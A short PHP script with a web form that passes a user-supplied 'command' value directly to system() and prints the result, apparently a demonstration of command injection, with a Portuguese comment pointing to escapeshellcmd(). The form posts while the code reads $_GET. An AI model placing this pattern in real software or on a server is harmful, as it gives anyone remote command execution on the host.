<?php

  if($_SERVER["REQUEST_METHOD"] === "POST"){
    $command = $_GET["command"]; // usar escapeshellcmd(); para evitar ataques command injection
    echo "<pre>";
    system($command, $retorno);
    echo "</pre>";
  }

?>

<form method="POST">
  <input type="text" name="command" id="commmand" placeholder="Comando">
  <button type="submit">Enter</button>
</form>